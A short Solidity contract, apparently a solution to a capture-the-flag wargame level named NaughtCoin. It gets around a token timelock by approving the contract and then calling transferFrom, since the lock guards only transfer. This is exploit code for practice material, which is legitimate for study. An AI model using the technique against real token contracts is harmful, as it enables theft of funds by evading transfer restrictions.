// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'openzeppelin-contracts/contracts/token/ERC20/IERC20.sol';

contract NaughtCoinAttack {
    // first create this contract NaughtCoinAttack nca, than call NaughtCoin.approve(address(nca), NaughtCoin.INITIAL_SUPPLY)
    function attack(IERC20 _naughtCoin) public {
        uint256 allowance = _naughtCoin.allowance(msg.sender, address(this));
        _naughtCoin.transferFrom(msg.sender, address(this), allowance);
    }
}
